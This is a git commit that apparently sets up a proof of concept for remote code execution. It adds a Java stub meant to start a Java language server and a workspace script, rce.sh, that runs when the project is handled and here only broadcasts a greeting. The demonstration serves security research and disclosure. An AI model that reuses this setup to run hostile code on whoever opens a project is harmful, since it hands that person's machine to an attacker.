cf39f25326197e612739b6f31640b069c9fc0363
wtm@offensi.com <wtm@offensi.com>
2019-08-07 17:51:27 +0200

    initial

---
+++ LiveOverflow.java
@@ -0,0 +1,8 @@
+/* PoC for LiveOverflow by wtm@offensi.com */ 
+
+public class LiveOverflow
+{
+	public static void main(String[] args) {
+		System.out.println("No, arbitrary code does not go here! this code is used to fire up the Java language server only :)");
+	}
+}
---
+++ workspace/rce.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+# yes the arbitrary code does go here ;)
+printf  '=============================\nHi LiveOverflow, code was executed :)\n=============================' | wall 
